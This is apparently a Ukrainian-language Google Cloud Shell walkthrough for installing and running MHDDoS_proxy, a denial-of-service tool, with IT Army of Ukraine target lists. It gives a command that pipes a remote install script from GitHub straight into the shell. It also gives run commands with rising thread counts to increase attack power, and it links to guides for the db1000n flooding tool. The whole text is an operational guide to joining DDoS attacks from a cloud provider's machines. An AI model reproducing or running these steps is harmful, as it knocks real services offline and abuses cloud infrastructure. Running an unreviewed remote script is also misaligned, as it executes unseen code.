#   Все буде Україна! 💙💛

## Привіт друзі. Бажаю вам гарного дня!

### **Встановлення та запуск застосунку MHDDoS_proxy

- для початківців пропоную хоча б частково ознайомитись з  інструкцією 👉  [Як запустити «Death by 1000 needles» (db1000n) в Google Cloud Shell](https://telegra.ph/YAk-zapustiti-dvanadcyat-ekzemplyar%D1%96v-Death-by-1000-needles-db1000n-v-Google-Cloud-Shell-ne-vikoristovuyuchi-VPN-05-04)

### ☁️  Cloud Shell  зараз працє в  ефемерному режимі
- це означає що все створене під час цього сеансу видалиться разом з віртуальною машиною  **після закінчення даного сеансу**

###  Зверніть увагу   
- якщо з'єднання перервано, бажано  **перезавантажитись** натиснувши кнопку

[![Open in Cloud Shell](https://telegra.ph/file/22b02a59993bd344b2bc9.png)](https://shell.cloud.google.com/cloudshell/open?shellonly=true&git_repo=https://github.com/patatakartata/Cloud_Shell_DDoS&tutorial=mhddos_proxy_tutorial.md)

Щоб перейти до роботи з **MHDDoS_proxy** натисніть **START**

 ## Давайте почнемо
-  щоб встановити MHDDoS_proxy скопіюйте команду розташовану нижче та натисніть клавішу **ENTER** 
```bash
cd ~/ && source <(curl https://raw.githubusercontent.com/patatakartata/Cloud_Shell_DDoS/main/mhddos_proxy_install.sh)
```
-   якщо деякий час все працює без ***роз'єднань***, можна підвищити потужність. Для цього *зупиніть* процес натиснувши **Ctrl+C** та запустіть наступну команду
```bash
cd ~/ && cd mhddos_proxy && ./runner.sh python3 -t 500 --itarmy --vpn
```
-   або наступну команду ще з більшою потужністю
```bash
cd ~/ && cd mhddos_proxy && ./runner.sh python3 -t 600 --itarmy --vpn
```
### 
Щоб переглянути навантаження на процесор використаємо команду **htop**
-   для цього додайте ще один термінал натиснувши 
<walkthrough-open-cloud-shell-button open-cloud-shell><walkthrough-open-cloud-shell-button open-cloud-shell/>

    та виконайте наступну команду
```bash
htop
```
Щоб ознайомитись з додатковою інформацією натисніть кнопку **NEXT**

## Пропоную для ознайомлення:

* натисніть на кнопку щоб завантажити новий сеанс Google Cloud Shell з інструкцією по запуску **«Death by 1000 needles» (db1000n)**.

[![Open in Cloud Shell](https://telegra.ph/file/22b02a59993bd344b2bc9.png)](https://shell.cloud.google.com/cloudshell/open?shellonly=true&git_repo=https://github.com/patatakartata/Cloud_Shell_DDoS&tutorial=tutorial.md)

* інструкція для початківців   
 👉 [Як запустити «Death by 1000 needles» (db1000n) в Google Cloud Shell](https://telegra.ph/YAk-zapustiti-dvanadcyat-ekzemplyar%D1%96v-Death-by-1000-needles-db1000n-v-Google-Cloud-Shell-ne-vikoristovuyuchi-VPN-05-04)

* інструкція для більш досвідчених   
 👉 [Як запустити потужний Db1000nX100 з використанням VPN в Google Cloud Shell](https://telegra.ph/Zapusk-Db1000nX100-u-Google-Cloud-Shell-05-20)
 
* офіційна сторінка   [⚡ It Army of Ukraine ⚡](https://itarmy.com.ua/)  має багато корисної інформації   

##  **Гуртом переможемо! 💙💛**

<walkthrough-conclusion-trophy>
</walkthrough-conclusion-trophy>
Натиснувши кнопку FINISH довідка закриєця і ви перейдете до головного меню довідника Google Cloud Shell.   
Кнопка PREVIOUS поверне вас на попередню сторінку.

<walkthrough-footnote>Звертайтесь patatakartata@gmail.com або @patatakartata</walkthrough-footnote>
